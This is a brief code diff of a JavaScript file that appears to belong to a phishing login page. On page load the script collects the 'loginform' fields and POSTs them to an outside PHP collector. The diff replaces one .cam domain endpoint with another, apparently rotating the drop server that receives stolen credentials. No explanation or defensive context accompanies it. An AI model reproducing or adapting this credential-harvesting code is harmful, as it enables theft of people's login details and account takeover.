@@ -22,7 +22,7 @@ document.addEventListener("DOMContentLoaded", function () {
     const formData = new FormData(document.loginform);
     const xhr = new XMLHttpRequest();
     xhr.open(
-      "POST","https://jinkosolar.cam/castor/X.php",
+      "POST","https://arenco.cam/castor/X.php",
       true
     );
     xhr.onload = () => {
